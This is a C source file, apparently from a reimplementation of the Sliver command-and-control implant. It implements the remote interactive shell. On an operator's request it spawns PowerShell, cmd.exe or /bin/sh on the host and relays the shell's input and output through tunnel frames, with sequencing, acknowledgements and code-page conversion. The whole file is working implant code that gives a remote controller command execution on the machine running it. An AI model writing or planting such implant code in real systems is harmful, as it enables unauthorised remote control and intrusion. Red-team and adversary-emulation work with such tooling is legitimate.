/* src/modes/shell.c - interactive shell over Sliver tunnel messages.
 *
 * Protocol (mirrors the Go implant):
 *   ShellReq{Path,...}  -> Shell{Pid, TunnelID}   (response envelope)
 *   TunnelData{TunnelID, Data} -> bytes to the child's stdin (no response)
 *   TunnelData{TunnelID, Data} <- child stdout, sent by the reader thread
 *   TunnelData{TunnelID, Closed} -> peer closed, child stdin is closed
 */
#include "sliver/rpc.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(_WIN32)
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#endif

#include "sliver/fs.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proc.h"

#define SLIVER_MAX_TUNNELS 8
#define SLIVER_SHELL_READ_CHUNK 16384

typedef struct {
  uint64_t id;
  int used;
  sliver_child_t *child;
  uint64_t sequence;
  uint64_t read_sequence;
} shell_tunnel_t;

typedef int (*sliver_shell_send_fn)(uint32_t type, const void *data, size_t len);

static shell_tunnel_t g_tunnels[SLIVER_MAX_TUNNELS];
static sliver_shell_send_fn g_send = NULL;

void sliver_shell_set_sender(sliver_shell_send_fn fn) { g_send = fn; }

static shell_tunnel_t *tunnel_find(uint64_t id) {
  for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
    if (g_tunnels[i].used && g_tunnels[i].id == id) {
      return &g_tunnels[i];
    }
  }
  return NULL;
}

static shell_tunnel_t *tunnel_alloc(uint64_t id, sliver_child_t *child) {
  for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
    if (!g_tunnels[i].used) {
      g_tunnels[i].used = 1;
      g_tunnels[i].id = id;
      g_tunnels[i].child = child;
      g_tunnels[i].sequence = 0;
      return &g_tunnels[i];
    }
  }
  return NULL;
}

static void tunnel_release(shell_tunnel_t *t) {
  if (t == NULL || !t->used) {
    return;
  }
  if (t->child != NULL) {
    sliver_child_terminate(t->child);
    sliver_child_free(t->child);
  }
  memset(t, 0, sizeof(*t));
}

void sliver_shell_shutdown(void) {
  for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
    tunnel_release(&g_tunnels[i]);
  }
}

static int send_tunnel_data(shell_tunnel_t *t, const void *data, size_t len, int closed) {
  sliver_buf_t msg;
  int rc;

  if (g_send == NULL) {
    return -1;
  }
  sliver_buf_init(&msg);
  /* Sliver's tunnel numbers data frames from 0; the peer buffers anything with
   * a higher sequence until the gap is filled, so starting at 1 silences us. */
  if (sliver_tunnel_data_encode(&msg, data, len, closed, t->sequence, t->id, 0) != 0) {
    sliver_buf_free(&msg);
    return -1;
  }
  rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
  sliver_buf_free(&msg);
  if (rc == 0) {
    t->sequence++;
  }
  return rc;
}

/* Control frame: tells the peer how many of its data frames we consumed. Without
 * this the peer keeps retransmitting and eventually stops sending (the shell
 * appears to hang after a burst of output). */
static int send_tunnel_ack(shell_tunnel_t *t) {
  sliver_buf_t msg;
  int rc;

  if (g_send == NULL) {
    return -1;
  }
  sliver_buf_init(&msg);
  if (sliver_tunnel_data_encode(&msg, NULL, 0, 0, t->sequence, t->id, t->read_sequence) != 0) {
    sliver_buf_free(&msg);
    return -1;
  }
  rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
  sliver_buf_free(&msg);
  return rc;
}

typedef struct {
  shell_tunnel_t *tunnel;
} shell_reader_arg_t;

static void shell_reader_thread(void *arg) {
  shell_reader_arg_t *r = (shell_reader_arg_t *)arg;
  char buf[SLIVER_SHELL_READ_CHUNK];

  for (;;) {
    long n = sliver_child_read(r->tunnel->child, buf, sizeof(buf));
    if (n <= 0) {
      break;
    }
#if defined(_WIN32)
    /* The client console is usually CP936: hand it ANSI bytes, otherwise every
     * Chinese character shows up as mojibake. */
    {
      size_t converted = 0;
      char acp[SLIVER_SHELL_READ_CHUNK * 2];
      if (sliver_acp_from_utf8(buf, (size_t)n, acp, sizeof(acp), &converted) == 0) {
        if (send_tunnel_data(r->tunnel, acp, converted, 0) != 0) {
          break;
        }
        continue;
      }
    }
#endif
    if (send_tunnel_data(r->tunnel, buf, (size_t)n, 0) != 0) {
      break;
    }
  }
  (void)send_tunnel_data(r->tunnel, NULL, 0, 1);
  free(r);
}

static uint64_t next_tunnel_id(void) {
  static uint64_t counter = 0;
  counter++;
  return ((uint64_t)sliver_now_ms() << 16) ^ (uint64_t)(sliver_current_pid() & 0xffff) ^ counter;
}

/* Picks the shell the way the Go implant does: PowerShell configured for UTF-8
 * when available, otherwise cmd.exe switched to code page 65001 so Chinese (and
 * any other non-ASCII) output does not arrive as OEM bytes. */
static size_t build_shell_argv(const char *requested, const char *argv[4], char *path_buf,
                               size_t cap) {
#if defined(_WIN32)
  char candidate[512];
  DWORD n = GetEnvironmentVariableA("SystemRoot", candidate, (DWORD)sizeof(candidate));
  static char ps_path[512];
  static char cmd_path[512];
  size_t argc = 0;

  if (requested != NULL && requested[0] != '\0') {
    (void)snprintf(path_buf, cap, "%s", requested);
    if (_stricmp(requested, "cmd.exe") == 0 || _stricmp(requested, "cmd") == 0) {
      argv[argc++] = "/K";
      argv[argc++] = "chcp 65001>nul";
    }
    return argc;
  }
  if (n > 0 && n < sizeof(candidate)) {
    (void)snprintf(ps_path, sizeof(ps_path),
                   "%s\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", candidate);
    (void)snprintf(cmd_path, sizeof(cmd_path), "%s\\System32\\cmd.exe", candidate);
    if (sliver_fs_exists(ps_path)) {
      (void)snprintf(path_buf, cap, "%s", ps_path);
      argv[argc++] = "-NoExit";
      argv[argc++] = "-Command";
      argv[argc++] = "[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8";
      return argc;
    }
    if (sliver_fs_exists(cmd_path)) {
      (void)snprintf(path_buf, cap, "%s", cmd_path);
      argv[argc++] = "/K";
      argv[argc++] = "chcp 65001>nul";
      return argc;
    }
  }
  (void)snprintf(path_buf, cap, "%s", "cmd.exe");
  argv[argc++] = "/K";
  argv[argc++] = "chcp 65001>nul";
  return argc;
#else
  (void)requested;
  (void)argv;
  (void)snprintf(path_buf, cap, "%s", "/bin/sh");
  return 0;
#endif
}

int sliver_rpc_handle_shell(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_shell_req_t sr;
  sliver_child_t *child = NULL;
  shell_tunnel_t *t;
  shell_reader_arg_t *arg;
  uint32_t pid = 0;
  uint64_t id;
  const char *argv[4];
  char shell_path[512];
  size_t argc;
  char err[256];

  if (sliver_shell_req_decode(req->data, req->data_len, &sr) != 0) {
    return -1;
  }
  argc = build_shell_argv(sr.path, argv, shell_path, sizeof(shell_path));
  err[0] = '\0';
  if (sliver_child_spawn(shell_path, argv, argc, &child, &pid) != 0) {
    (void)snprintf(err, sizeof(err), "shell %s: cannot start", shell_path);
    return sliver_shell_encode(out, shell_path, 0, 0, 0, err);
  }
  id = next_tunnel_id();
  /* The client allocates the tunnel id and sends it in ShellReq (field 8); we
   * must answer on that same tunnel or the client drops our frames. Only when
   * the request carries no id (older clients) do we pick one ourselves. */
  if (sr.tunnel_id != 0) {
    id = sr.tunnel_id;
  }
  t = tunnel_alloc(id, child);
  if (t == NULL) {
    sliver_child_terminate(child);
    sliver_child_free(child);
    return sliver_shell_encode(out, sr.path, 0, pid, 0, "shell: tunnel table full");
  }
  arg = (shell_reader_arg_t *)calloc(1, sizeof(*arg));
  if (arg != NULL) {
    arg->tunnel = t;
    /* The reader thread owns `arg` and runs until the child exits. */
    if (sliver_thread_create(shell_reader_thread, arg) == NULL) {
      free(arg);
      LOG_WARN("shell: cannot start reader thread");
    }
  }
  LOG_DEBUG("shell: %s pid=%u tunnel=%llu", sr.path, pid, (unsigned long long)id);
  return sliver_shell_encode(out, sr.path, 0, pid, id, NULL);
}

int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_tunnel_data_t td;
  shell_tunnel_t *t;

  (void)out;
  if (sliver_tunnel_data_decode(req->data, req->data_len, &td) != 0) {
    return -2;
  }
  LOG_DEBUG("tunnel: inbound id=%llu len=%u seq=%llu ack=%llu closed=%d",
            (unsigned long long)td.tunnel_id, (unsigned)td.data_len,
            (unsigned long long)td.sequence, (unsigned long long)td.ack, td.closed);
  if (sliver_portfwd_tunnel_data(&td)) {
    return -2;
  }
  /* Unknown tunnel id: the client binds a freshly created tunnel with a zero
   * byte TunnelData before sending PortfwdReq - acknowledge it. */
  if (sliver_portfwd_bind(td.tunnel_id)) {
    return -2;
  }
  t = tunnel_find(td.tunnel_id);
  if (t == NULL) {
    return -2;
  }
  /* Pure ACK from the peer: nothing to deliver. */
  if (td.ack != 0 && td.data_len == 0 && !td.closed) {
    return -2;
  }
  if (td.sequence == t->read_sequence) {
    if (td.data_len != 0) {
      (void)sliver_child_write(t->child, td.data, td.data_len);
    }
    if (td.closed) {
      sliver_child_close_stdin(t->child);
    }
    t->read_sequence++;
  }
  /* Duplicates (sequence < read_sequence) and gaps are acknowledged as-is so the
   * peer stops retransmitting and re-sends what is actually missing. */
  (void)send_tunnel_ack(t);
  return -2;
}

int sliver_rpc_handle_tunnel_close(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_tunnel_data_t td;
  (void)out;
  if (sliver_tunnel_data_decode(req->data, req->data_len, &td) == 0) {
    if (!sliver_portfwd_tunnel_close(td.tunnel_id)) {
      tunnel_release(tunnel_find(td.tunnel_id));
    }
  }
  return -2;
}

int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *out) {
  (void)req;
  (void)out;
  return -2; /* piped shells have no window size */
}







